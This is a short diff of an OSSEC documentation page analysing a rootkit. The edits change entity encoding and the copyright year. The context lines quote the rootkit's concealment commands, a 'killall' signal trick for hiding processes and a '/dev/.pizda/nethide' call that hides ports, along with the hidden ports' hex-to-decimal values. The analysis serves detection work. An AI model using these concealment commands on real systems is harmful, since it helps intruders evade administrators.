+<li><p>He uses killall .31 to hide gib, jessuscd and caine. In order to make them viewable you would have to enter killall .32(There is a link at the bottom of this paper that explains this concept in much more detail.).</p></li>
+<li><p>You see many references to /dev/.pizda/nethide. An example is:</p></li>
 </ol>
-<p>/dev/.pizda/nethide &#8221;:79F5&#8221; 1&gt;/dev/null 2&gt;/dev/null.</p>
+<p>/dev/.pizda/nethide “:79F5” 1&gt;/dev/null 2&gt;/dev/null.</p>
 <p>Well, for all who don.t have enough time to do hex conversions here are the hex to decimal conversions:</p>
 <p>48EB = 18667                         1A05 = 6661</p>
 <p>79F5 = 31221                         1A06 = 6662</p>
@@ -515,9 +502,8 @@ for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
       
     </p>
     <p>
-        &copy; Copyright 2010-2020, OSSEC Project Team.<br/>
+        &copy; Copyright 2010-2021, OSSEC Project Team.<br/>
     OSSEC <b>ossec.net</b> domain owned and maintained by <a href="https://www.ossec.net" target="_blank">OSSEC Foundation</a><br/>
-      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.5.2 - 
     Home page graphics courtesy of <a href="https://pixabay.com" target="_blank">pixabay</a>
     </p>
   </div>
